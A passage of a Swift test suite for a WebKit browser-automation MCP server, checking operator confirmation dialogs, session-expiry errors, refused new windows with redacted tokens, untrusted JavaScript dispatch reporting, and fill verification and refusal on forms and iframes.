    #expect(try object(declined["result"])["isError"] == .bool(true))

    let replay = try await call(
      server,
      id: 4,
      method: "tools/call",
      params: .object([
        "name": .string("browser_act"),
        "arguments": .object(arguments),
        "requestState": .string(requestState),
        "inputResponses": .object([
          "confirmation": .object([
            "action": .string("accept"), "content": .object(["confirm": .bool(true)]),
          ])
        ]),
      ]),
      modern: true
    )
    #expect(try object(replay["error"])["code"] == .int(-32602))
  }

  @Test("A navigation to a port above 65535 is refused, not a crash")
  func outOfRangePortIsRefused() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry, presentHumanWindows: false)
    let opened = try await toolCall(
      server, id: 1, name: "browser_session", arguments: ["operation": .string("open")])
    let session = try object(try object(opened["result"])["structuredContent"])["session_id"]
    let navigated = try await toolCall(
      server, id: 2, name: "browser_navigate",
      arguments: [
        "session_id": try #require(session),
        "url": .string("https://ha.example.ts.net:70000/"),
      ])
    #expect(try object(navigated["error"])["code"] == .int(-32602))
  }

  @Test("A handle whose session is gone gets session_expired, not an internal error")
  func vanishedSessionIsTyped() async throws {
    let registry = try WebKitSessionRegistry()
    let server = WebKitMCPServer(registry: registry)
    for (index, name) in ["browser_observe", "browser_read_text"].enumerated() {
      let response = try await toolCall(
        server, id: Int64(index + 1), name: name,
        arguments: ["session_id": .string(UUID().uuidString)])
      let result = try object(response["result"])
      #expect(result["isError"] == .bool(true))
      #expect(try object(result["structuredContent"])["code"] == .string("session_expired"))
      #expect(
        try object(result["structuredContent"])["cause"]
          == .string("unknown_to_this_app_process"))
    }
    // A closed one says it was closed (AuroraPulse session, 2026-09-30).
    let closed = try registry.open()
    try registry.close(closed)
    let response = try await toolCall(
      server, id: 3, name: "browser_observe",
      arguments: ["session_id": .string(closed.rawValue.uuidString)])
    let structured = try object(try object(response["result"])["structuredContent"])
    #expect(structured["cause"] == .string("closed"))
    #expect(structured["removed_at"] != .null)
  }

  @Test("A click WebKit asked a new window for says so, and the next action does not inherit it")
  func suppressedNewWindowIsReportedOnceToTheCaller() async throws {
    // A page that opens its invoice with window.open() is still refused a window; a plain
    // target=_blank link is now followed in the same view instead. WebKit's
    // default for an unimplemented `createWebViewWith` cancelled it silently, so this
    // click reported nothing and could not be told from one that missed. The window is
    // still refused — one session, one page an approval can name — but the request is
    // now reported, with its query values redacted, and reaching it costs a separate
    // `browser_navigate` under the ordinary exact-destination confirmation.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <button onclick="window.open('/invoice-0421.pdf?session=s3cr3t-token')">Download invoice</button>
      <button onclick="document.title='Noted'">Mark as read</button>
      """,
      baseURL: URL(string: "https://example.test/billing"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    #expect(observation["suppressed_new_window"] == .null)
    let link = try object(try array(observation["elements"]).first)
    let linkArguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(link["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("suppressed-window-invoice"),
      "postcondition": .object([
        "type": .string("url_equals"),
        "value": .string("https://example.test/invoice-0421.pdf"),
      ]),
    ]
    let prepared = try await toolCall(
      server, id: 2, name: "browser_act", arguments: linkArguments)
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: linkArguments,
      requestState: try string(try object(prepared["result"])["requestState"]),
      action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    let suppressed = try object(structured["new_window_suppressed"])
    #expect(
      suppressed["destination"]
        == .string("https://example.test/invoice-0421.pdf?session=<redacted>"))
    #expect(suppressed["navigationType"] == .string("other"))
    #expect(try string(structured["safe_next_step"]).contains("browser_navigate"))
    // Nothing was followed: the page an approval was granted on is still the page loaded.
    #expect(runtime.webView.url?.absoluteString == "https://example.test/billing")

    let afterCall = try await toolCall(
      server, id: 4, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let after = try object(try object(afterCall["result"])["structuredContent"])
    #expect(try object(after["suppressed_new_window"])["destination"] != .null)

    // The trap this must not fall into: a record nothing scopes to its own dispatch, so
    // the next unrelated action reports a suppression that already happened.
    let button = try object(try array(after["elements"]).last)
    let buttonArguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(after["observationID"])),
      "element_id": .string(try string(button["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("suppressed-window-mark-as-read"),
      "postcondition": .object([
        "type": .string("title_equals"), "value": .string("Noted"),
      ]),
    ]
    let secondPrepared = try await toolCall(
      server, id: 5, name: "browser_act", arguments: buttonArguments)
    let secondCompleted = try await roundTripToolCall(
      server, id: 6, name: "browser_act", arguments: buttonArguments,
      requestState: try string(try object(secondPrepared["result"])["requestState"]),
      action: "accept", confirm: true)
    let secondStructured = try object(
      try object(secondCompleted["result"])["structuredContent"])
    #expect(secondStructured["new_window_suppressed"] == nil)
  }

  @Test("A confirmed selection and a confirmed hover both report untrusted JavaScript dispatch")
  func selectOptionAndHoverReportUntrustedJavaScriptDispatch() async throws {
    // Neither has a trusted route out of WebKit: a `<select>` popup is an NSMenu with
    // its own event loop that a posted NSEvent never reaches, and no
    // NSEventTypeMouseMoved is forwarded to an embedder at all. So both are dispatched
    // as JavaScript and reported as untrusted, exactly as `fill` and `blur` already are.
    // What must never happen is either of them reporting `trusted` with no receipt.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <label for='country'>Country</label>
      <select id='country' onchange="document.title = 'Shipping to ' + this.value">
        <option value='Germany'>Germany</option>
        <option value='France'>France</option>
      </select>
      <button id='account' onmouseover="document.body.dataset.menu = 'open'">Account</button>
      """,
      baseURL: URL(string: "https://example.test/checkout"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(responses: [true, true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])

    let selected = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try elementID(in: observation, named: "Country")),
        "operation": .string("select_option"),
        "value": .string("France"),
        "idempotency_key": .string("select-country-once"),
      ])
    let selectionStructured = try object(try object(selected["result"])["structuredContent"])
    #expect(selectionStructured["dispatch_mode"] == .string("javascript"))
    #expect(selectionStructured["trusted_gesture_state"] == .string("untrusted_javascript"))
    #expect(try object(selectionStructured["verification"])["verified"] != nil)

    let reobserved = try await toolCall(
      server, id: 3, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let fresh = try object(try object(reobserved["result"])["structuredContent"])
    // Hover carries no postcondition of its own: what it reveals belongs to the next
    // observation, and nothing here claims a menu appeared.
    let hovered = try await toolCall(
      server, id: 4, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(fresh["observationID"])),
        "element_id": .string(try elementID(in: fresh, named: "Account")),
        "operation": .string("hover"),
        "idempotency_key": .string("hover-account-once"),
      ])
    let hoverStructured = try object(try object(hovered["result"])["structuredContent"])
    #expect(hoverStructured["dispatch_mode"] == .string("javascript"))
    #expect(hoverStructured["trusted_gesture_state"] == .string("untrusted_javascript"))
    // Nothing claimed, and the next step said out loud.
    #expect(hoverStructured["verification"] == .string("not_attempted"))
    #expect(try string(hoverStructured["safe_next_step"]).contains("Observe again"))
    let menu =
      try await runtime.webView.evaluateJavaScript("document.body.dataset.menu")
      as? String
    #expect(menu == "open")
    #expect(presenter.requests.count == 2, "both gestures went through the one funnel")
  }

  @Test("A selection confirmation names the option being chosen and the one already selected")
  func selectOptionConfirmationNamesBothLabels() async throws {
    // "Choose France" does not tell an operator whether that is a change or a no-op.
    // The confirmation has to show the change, so it states both labels.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <label for='country'>Country</label>
      <select id='country'>
        <option value='de'>Germany</option>
        <option value='fr'>France</option>
      </select>
      """,
      baseURL: URL(string: "https://example.test/checkout"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(responses: [false])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    _ = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try elementID(in: observation, named: "Country")),
        "operation": .string("select_option"),
        "value": .string("France"),
        "idempotency_key": .string("select-country-confirmation"),
      ])
    let shown = try #require(presenter.requests.first?.message)
    #expect(shown.contains("Option to be selected:"))
    #expect(shown.contains("\"France\""), "the dialog never named the option being chosen")
    #expect(shown.contains("Option currently selected"))
    #expect(shown.contains("\"Germany\""), "the dialog never named the current selection")
    // The control itself, so the operator knows which dropdown is being changed.
    #expect(shown.contains("\"Country\""))
  }

  @Test("An option label read out of the observation is a label select_option accepts")
  func publishedOptionLabelIsAcceptedBySelectOption() async throws {
    // The two halves have to agree about whitespace. The observation collapses every
    // label it publishes and `select_option` collapses the label it is given at the
    // server boundary by the same rule; if either grew its own rule an agent would be
    // copying a string out of one half that the other half then refuses. So this test
    // never types a label — it reads one out of the payload and hands it straight back.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <label for='country'>Country</label>
      <select id='country'>
        <option value='de'>Germany</option>
        <option value='fr'>France
             (métropole)</option>
      </select>
      """,
      baseURL: URL(string: "https://example.test/checkout"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let country = try element(in: observation, named: "Country")
    let published = try optionLabels(of: country)
    // The markup wraps the label across a line; the published one is collapsed.
    #expect(published == ["Germany", "France (métropole)"])
    // Taken from the payload by position, not by matching text, so a label published
    // in some other shape still reaches the writer and is refused there rather than
    // being quietly skipped over here.
    let wanted = try #require(published.last)

    let selected = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(country["elementID"])),
        "operation": .string("select_option"),
        "value": .string(wanted),
        "idempotency_key": .string("select-published-label-once"),
      ])
    let structured = try object(try object(selected["result"])["structuredContent"])
    // Accepted, dispatched and verified against the control's own readback: the label
    // the observation published is the label the writer takes.
    #expect(try object(structured["verification"])["verified"] != nil)

    let reobserved = try await toolCall(
      server, id: 3, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let fresh = try object(try object(reobserved["result"])["structuredContent"])
    let refreshed = try element(in: fresh, named: "Country")
    #expect(try provenancedText(refreshed["selectedOption"]) == wanted)
  }

  @Test("A confirmed fill verifies the same semantic target's exact value")
  func verifiedFill() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <label for='name'>Name</label><input id='name'>
      <script>
        const input = document.getElementById('name');
        input.addEventListener('input', () => {
          const marker = document.createElement('button');
          marker.textContent = 'Inserted by framework';
          document.body.prepend(marker);
          const replacement = input.cloneNode();
          replacement.value = input.value;
          input.replaceWith(replacement);
        }, { once: true });
      </script>
      """,
      baseURL: URL(string: "https://example.test/profile"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let element = try object(try array(observation["elements"]).first)
    let longFormValue = String(repeating: "WebKitUI ", count: 64) + "WebKitUI"
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(element["elementID"])),
      "operation": .string("fill"),
      "value": .string(longFormValue),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("fill-name-once"),
    ]
    var newlineArguments = arguments
    newlineArguments["value"] = .string("Kevin\nSubmit")
    newlineArguments["idempotency_key"] = .string("blocked-input-newline")
    let newline = try await toolCall(
      server, id: 2, name: "browser_act", arguments: newlineArguments)
    #expect(try object(newline["error"])["code"] == .int(-32602))

    var oversizedArguments = arguments
    oversizedArguments["value"] = .string(String(repeating: "A", count: 4_097))
    oversizedArguments["idempotency_key"] = .string("blocked-oversized-input")
    let oversized = try await toolCall(
      server, id: 3, name: "browser_act", arguments: oversizedArguments)
    #expect(try object(oversized["error"])["code"] == .int(-32602))

    let prepared = try await toolCall(server, id: 4, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server,
      id: 5,
      name: "browser_act",
      arguments: arguments,
      requestState: try string(required["requestState"]),
      action: "accept",
      confirm: true
    )

    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)
    let after = try await runtime.observe()
    let input = after.elements.first { $0.tag.segments.first?.text == "input" }
    #expect(input?.elementID == "e2")
    #expect(input?.value?.segments.first?.text == longFormValue)
  }

  @Test("A confirmed fill accepts an empty field without an observable value key")
  func emptyFieldWithoutValueEntryIsVerified() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <label>Start date <input type='date'></label>
      <script>
        document.querySelector('input').addEventListener('input', event => {
          event.currentTarget.type = 'text';
        });
      </script>
      """,
      baseURL: URL(string: "https://example.test/groups"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let runtimeObservation = try await runtime.observe()
    let runtimeInputs = runtimeObservation.elements.filter {
      $0.tag.segments.map(\.text).joined() == "input"
    }
    #expect(runtimeInputs.count == 1)
    let targetID = try #require(runtimeInputs.first).elementID
    let semanticValueKey = ObservationFieldKey(
      frameID: "main",
      elementID: try #require(runtimeInputs.first).locatorRecipe.semanticIdentity,
      field: "@value")
    let baseline = try runtimeObservation.canonicalState()
    #expect(!baseline.entries.contains { $0.key == semanticValueKey })

    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])

    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(targetID),
      "operation": .string("fill"),
      "value": .string("2026-10-11"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("fill-empty-without-value-entry-once"),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)

    let value =
      try await runtime.webView.evaluateJavaScript(
        "document.querySelector('input').value") as? String
    #expect(value == "2026-10-11")
  }

  @Test("Framed fill verifies exact value only after confirmation", arguments: [false, true])
  func sameOriginFrameFillIsVerified(native: Bool) async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <title>Local IAM form</title>
      <iframe width="600" height="200" srcdoc="
        &lt;h2&gt;Public profile&lt;/h2&gt;
        &lt;label&gt;Display name &lt;input name='public-name'&gt;&lt;/label&gt;
        &lt;input aria-label='Other field' name='public-name' value='untouched'&gt;
      "></iframe>
      """,
      baseURL: URL(string: "https://fixture.invalid/framed-profile"),
      timeout: .seconds(15), quietWindow: .milliseconds(100))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try element(in: observation, named: "Display name")
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(target["elementID"])),
      "operation": .string("fill"), "value": .string("Local reader"),
      "approval_mode": .string(native ? "native" : "mcp"),
      "idempotency_key": .string("framed-fill-once"),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let completed: [String: JSONValue]
    if native {
      completed = prepared
      #expect(presenter.requests.count == 1)
    } else {
      let required = try object(prepared["result"])
      completed = try await roundTripToolCall(
        server, id: 3, name: "browser_act", arguments: arguments,
        requestState: try string(required["requestState"]), action: "accept", confirm: true)
    }
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)
    let after = try await runtime.observe()
    #expect(
      after.elements.first { $0.accessibleName?.segments.first?.text == "Display name" }?
        .value?.segments.map(\.text).joined() == "Local reader")
    #expect(
      after.elements.first { $0.accessibleName?.segments.first?.text == "Other field" }?
        .value?.segments.map(\.text).joined() == "untouched")
  }

  @Test(
    "Framed native fill refuses cancellation, coverage or unstable geometry after approval",
    arguments: ["cancel", "move", "cover"])
  func sameOriginFrameFillRevalidatesApproval(change: String) async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <iframe width="600" height="200" srcdoc="
        &lt;label&gt;Display name &lt;input name='public-name' value='keep'&gt;&lt;/label&gt;
      "></iframe>
      """,
      baseURL: URL(string: "https://fixture.invalid/framed-approval"),
      timeout: .seconds(15), quietWindow: .milliseconds(100))
    let presenter = ConfirmationPresenterStub(responses: [change != "cancel"])
    presenter.beforeResponse = {
      if change == "move" {
        _ = try? await runtime.webView.evaluateJavaScript(
          """
          const d = document.querySelector('iframe').contentDocument;
          const style = d.createElement('style');
          style.textContent = '@keyframes move { from { transform:translateY(0) } to { transform:translateY(100px) } } input { animation:move 1s linear infinite }';
          d.head.append(style);
          """)
      } else if change == "cover" {
        _ = try? await runtime.webView.evaluateJavaScript(
          """
          const d = document.querySelector('iframe').contentDocument;
          const cover = d.createElement('div');
          cover.style = 'position:fixed;inset:0;background:white;z-index:999';
          d.body.append(cover);
          """)
      }
    }
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try element(in: observation, named: "Display name")
    let completed = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(target["elementID"])),
        "operation": .string("fill"), "value": .string("replacement"),
        "approval_mode": .string("native"),
        "idempotency_key": .string("framed-approval-once"),
      ])
    let result = try object(completed["result"])
    if change == "cover" {
      // Keep the existing unknown-dispatch contract: no success claim or replay.
      let structured = try object(result["structuredContent"])
      #expect(structured["action_state"] == .string("indeterminate"))
      #expect(try object(structured["verification"])["indeterminate"] != nil)
      #expect(structured["action_replayed"] == .bool(false))
      #expect(try string(structured["dispatch_error"]).contains("targetNotActionable"))
    } else {
      #expect(result["isError"] == .bool(true))
    }
    #expect(presenter.requests.count == 1)
    let unchanged =
      try await runtime.webView.evaluateJavaScript(
        "document.querySelector('iframe').contentDocument.querySelector('input').value === 'keep'")
      as? Bool
    #expect(unchanged == true)
  }

  @Test("An exact fill stays indeterminate while the live field is invalid")
  func invalidFillIsNotVerified() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <label for='description'>Short description</label>
      <input id='description' aria-invalid='false'>
      <script>
        document.getElementById('description').addEventListener('input', event => {
          event.currentTarget.setAttribute('aria-invalid', 'true');
        });
      </script>
      """,
      baseURL: URL(string: "https://play.google.com/console/form"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let element = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(element["elementID"])),
      "operation": .string("fill"),
      "value": .string("Present but rejected"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("invalid-fill-is-not-verified"),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["indeterminate"] != nil)

    let after = try await runtime.observe()
    #expect(after.elements.first?.value?.segments.first?.text == "Present but rejected")
    #expect(after.elements.first?.validationState == .invalid)
  }

  @Test("Exact fill verification canonicalizes Unicode and textarea line endings")
  func normalizedTextareaFillIsVerified() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<label for='description'>Description</label><textarea id='description'></textarea>",
      baseURL: URL(string: "https://example.test/listing"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let element = try object(try array(observation["elements"]).first)
    let value = "Cafe\u{301}\r\nSecond line"
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(element["elementID"])),
      "operation": .string("fill"),
      "value": .string(value),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("normalized-textarea-fill"),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)

    let after = try await runtime.observe()
    #expect(after.elements.first?.value?.segments.first?.text == "Café\nSecond line")
  }

  @Test("URL prefix postconditions verify an SPA route")
  func verifiedURLPrefix() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<button onclick=\"history.pushState({},'', '/console/apps/42')\">Open</button>",
      baseURL: URL(string: "https://example.test/start"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let element = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(element["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("url-prefix-spa-route"),
      "postcondition": .object([
        "type": .string("url_prefix"),
        "value": .string("https://example.test/console/"),
      ]),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)
  }

  @Test(
    "A confirmed fill supports semantic and roleless contenteditable editors",
    arguments: [
      "contenteditable='true' role='textbox' aria-label='Post body'",
      "contenteditable='true'",
      "contenteditable=''",
      "contenteditable='plaintext-only'",
    ])
  func verifiedContenteditableFill(attributes: String) async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<div id='betaAppLocalizations[fr-fr].description' name='betaAppLocalizations[fr-fr].description' \(attributes) style='width:400px;height:120px'>Draft</div>",
      baseURL: URL(string: "https://example.test/submit"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let original = try #require(try await runtime.observe().elements.first)
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let element = try object(try array(observation["elements"]).first)
    #expect(element["contentEditable"] == .bool(true))
    if !attributes.contains("role=") {
      #expect(element["accessibleName"] == nil || element["accessibleName"] == .null)
    }
    let inspected = try await toolCall(
      server, id: 10, name: "browser_inspect_element",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": observation["observationID"]!,
        "element_id": element["elementID"]!,
      ])
    #expect(
      try object(try object(inspected["result"])["structuredContent"])["contentEditable"]
        == .bool(true))
    let value =
      String(String(repeating: "Description publique. ", count: 77).prefix(1617)) + "Fin ici"
    #expect(value.count == 1624)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(element["elementID"])),
      "operation": .string("fill"),
      "value": .string(value),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("fill-contenteditable-once"),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil, "\(structured)")
    let after = try await runtime.observe()
    #expect(after.elements.first?.value?.segments.first?.text == value)
    #expect(
      after.elements.first?.locatorRecipe.semanticIdentity
        == original.locatorRecipe.semanticIdentity)
  }

  @Test(
    "Fill refuses noneditable wrappers and sensitive roleless editors before confirmation",
    arguments: [
      "<div tabindex='0' style='width:400px;height:120px'><div contenteditable='true'>Draft</div></div>",
      "<div contenteditable='false' tabindex='0' style='width:400px;height:120px'>Draft</div>",
      "<div contenteditable='true' name='password' style='width:400px;height:120px'>Draft</div>",
    ])
  func rolelessFillRefusals(html: String) async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      html, baseURL: URL(string: "https://example.test/beta"),
      timeout: .seconds(5), quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString)
      ])
    let observedResult = try #require(observed["result"], "\(observed)")
    let structured = try #require(
      try object(observedResult)["structuredContent"], "\(observedResult)")
    let observation = try object(structured)
    let rows = try #require(observation["elements"], "\(observation)")
    let elements = try array(rows).map { try object($0) }
    let element = try #require(
      elements.first {
        html.contains("password")
          ? $0["sensitive"] == .bool(true) : $0["contentEditable"] != .bool(true)
      }, "\(elements)")
    let result = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": observation["observationID"]!,
        "element_id": element["elementID"]!,
        "operation": .string("fill"), "value": .string("Replacement"),
        "approval_mode": .string("mcp"), "idempotency_key": .string("refused-roleless-fill"),
      ])
    let error = try #require(result["error"], "\(result)")
    #expect(try object(error)["code"] == .int(-32602))
    #expect(result["result"] == nil)
    #expect(
      try await runtime.webView.evaluateJavaScript("document.body.textContent") as? String
        == "Draft")
  }

  @Test("A native submit control requires submit and verifies its postcondition")
  func verifiedSubmit() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <form onsubmit="event.preventDefault(); const s=document.createElement('div');
        s.setAttribute('role','status'); s.textContent='Submitted once'; document.body.appendChild(s)">
